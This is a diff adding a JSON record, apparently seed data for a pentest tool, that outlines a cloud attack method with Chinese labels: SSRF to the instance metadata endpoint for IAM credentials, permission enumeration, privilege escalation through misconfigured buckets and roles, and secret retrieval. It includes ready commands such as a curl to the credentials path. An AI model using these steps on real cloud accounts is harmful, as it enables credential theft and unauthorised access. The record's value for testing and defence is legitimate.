@@ -1,0 +1,47 @@
+{
+  "id": "cloud-attack-methods",
+  "title": "云攻击方法论",
+  "vuln_pattern": "cloud-priv-esc",
+  "fingerprint": [
+    "aws",
+    "s3",
+    "iam",
+    "metadata",
+    "169.254.169.254",
+    "gcp",
+    "azure",
+    "assume-role",
+    "bucket",
+    "服务端请求伪造",
+    "内网探测",
+    "元数据",
+    "对象存储",
+    "存储桶",
+    "云权限",
+    "云环境",
+    "云"
+  ],
+  "exploit_steps": [
+    "SSRF/命中主机→读 IMDS 拿临时凭据(169.254.169.254/latest/meta-data/iam/...)",
+    "枚举权限:aws sts get-caller-identity、enumerate-iam/cloudfox",
+    "错配:公开 bucket、过宽 IAM、可 assume 的角色→提权",
+    "从 secrets manager/参数库取密钥"
+  ],
+  "key_payloads": [
+    "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "aws s3 ls s3://bucket --no-sign-request",
+    "cloudfox aws --profile p all-checks"
+  ],
+  "category": "cloud",
+  "cve": [],
+  "tags": [
+    "cloud",
+    "imds",
+    "iam"
+  ],
+  "source": "seed: pentest methodology",
+  "created_ts": 0.0,
+  "preconditions": [],
+  "verify_oracle": "",
+  "pitfalls": []
+}
